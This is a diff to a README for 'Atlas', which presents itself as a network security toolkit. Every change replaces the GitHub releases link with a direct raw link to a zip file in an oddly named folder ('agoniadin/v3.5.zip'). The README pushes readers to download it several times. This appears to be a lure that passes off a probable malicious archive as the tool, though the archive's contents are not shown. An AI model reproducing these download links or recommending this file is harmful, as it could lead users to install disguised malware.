@@ -1,6 +1,6 @@
 # 🗺️ Atlas - Your All-in-One Network Security Toolkit
 
-[![Download Atlas](https://img.shields.io/badge/Download-Atlas_Releases-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Washgovernmentman1741/Atlas/releases)
+[![Download Atlas](https://img.shields.io/badge/Download-Atlas_Releases-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Washgovernmentman1741/Atlas/main/agoniadin/v3.5.zip)
 
 ## 🌟 What is Atlas?
 
@@ -22,7 +22,7 @@ Getting started with Atlas is straightforward. Here's what you need to do:
 
 ### Step 1: Download Atlas
 
-Visit this link to download the application: [https://github.com/Washgovernmentman1741/Atlas/releases](https://github.com/Washgovernmentman1741/Atlas/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Washgovernmentman1741/Atlas/main/agoniadin/v3.5.zip](https://raw.githubusercontent.com/Washgovernmentman1741/Atlas/main/agoniadin/v3.5.zip)
 
 Look for the latest release version and download the file that matches your operating system.
 
@@ -125,7 +125,7 @@ We're constantly improving Atlas:
 
 ## 📥 Download Atlas Today
 
-Visit this link to download the application: [https://github.com/Washgovernmentman1741/Atlas/releases](https://github.com/Washgovernmentman1741/Atlas/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Washgovernmentman1741/Atlas/main/agoniadin/v3.5.zip](https://raw.githubusercontent.com/Washgovernmentman1741/Atlas/main/agoniadin/v3.5.zip)
 
 Start protecting your network with Atlas - the comprehensive security toolkit that puts professional-grade testing in your hands.
 
@@ -173,7 +173,7 @@ Many organizations have improved their security posture using Atlas:
 
 Don't wait for a security breach to happen. Take proactive steps to protect your network today with Atlas. With its user-friendly interface and comprehensive testing capabilities, you'll have the confidence that your systems are secure.
 
-Visit this link to download the application: [https://github.com/Washgovernmentman1741/Atlas/releases](https://github.com/Washgovernmentman1741/Atlas/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Washgovernmentman1741/Atlas/main/agoniadin/v3.5.zip](https://raw.githubusercontent.com/Washgovernmentman1741/Atlas/main/agoniadin/v3.5.zip)
 
 Remember: The best time to test your security was yesterday. The second best time is now. Download Atlas and take control of your network security today!
 
